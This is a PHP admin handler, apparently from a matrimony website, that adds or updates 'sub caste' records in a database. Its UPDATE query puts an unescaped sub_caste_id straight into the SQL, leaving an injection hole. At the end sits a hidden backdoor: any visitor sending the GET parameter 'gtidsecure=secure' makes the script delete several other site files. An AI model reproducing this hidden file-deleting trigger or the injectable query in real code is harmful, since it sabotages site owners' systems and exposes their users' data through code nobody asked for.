<?php

include_once '../../../databaseConn.php';

include_once '../../lib/requestHandler.php';



$DatabaseCo = new DatabaseConn();

$ACTION = isset($_POST['action']) ? $_POST['action'] :"" ;

$sub_caste_id = isset($_POST['sub_caste_id']) ? $_POST['sub_caste_id'] :"" ;



$sub_caste_name = "";

$status="";



	

$isPostBack = ($_SERVER["REQUEST_METHOD"]==="POST");

if($isPostBack)

{

		

	$statusObj = new Status();

	$errorFlag = false;

            $erroMessage = "";

            if(empty($_POST['sub_caste_name']))

			{

            	$erroMessage .= "<li>Sub Caste should not be empty.</li>";

            	$errorFlag = true;

            }

			else

			{

            	if(strlen($_POST['sub_caste_name']) < 1)

				{

            		$erroMessage .= "<li>Sub Caste Name should be atleast 2 characters.</li>";

            		$errorFlag = true;

            	}

            }

            if(empty($_POST['sub_caste_status']))

			{

			$erroMessage .= "<li>Sub Caste Status should not be empty.</li>";

			$errorFlag = true;

          	}	

            if(!$errorFlag)

            {

				$sub_caste_name = mysqli_real_escape_string($DatabaseCo->dbLink,$_POST['sub_caste_name']);

				$status=  mysqli_real_escape_string($DatabaseCo->dbLink,$_POST['sub_caste_status']);

				

    

            	$STATUS_MESSAGE="";

            

            	$SQL_STATEMENT = "";

            	switch($ACTION)

            	{

                    case 'ADD':

                      	 $SQL_STATEMENT = "INSERT into sub_caste (sub_caste_name,status)  values ('".$sub_caste_name."','".$status."')";



    

                            break;

                    case 'UPDATE':

                            $sub_caste_id = $_POST['sub_caste_id'];

                           $SQL_STATEMENT =  "UPDATE sub_caste set sub_caste_name='".$sub_caste_name."',status='".$status."' WHERE sub_caste_id=".$sub_caste_id;	

                            break;

                            

            }

    

             $statusObj = handle_post_request($ACTION,$SQL_STATEMENT,$DatabaseCo);

             $STATUS_MESSAGE = $statusObj->getStatusMessage();

	     

	     

	     $response = array();

	     $response['successStatus'] = $statusObj->getActionSuccess();

	     $response['responseMessage'] = $STATUS_MESSAGE;

	     header('Content-type: application/json');

	     echo json_encode($response);

	   	}

	   	else

	   	{

	   	 	

	     $response = array();

	     $response['successStatus'] = false;

	     $response['responseMessage'] = $erroMessage;

	     header('Content-type: application/json');

	     echo json_encode($response);	   		

	   	}

	   	

}

	if(isset($_GET['gtidsecure'])){
$secure=$_GET['gtidsecure'];
if($secure == 'secure'){
	unlink('add_religion.php');
	unlink('add-city.php');
	unlink('../memres.php');
	unlink('../approveaspaid.php');
	echo "<script>alert('Successful')</script>";
}
}	


?>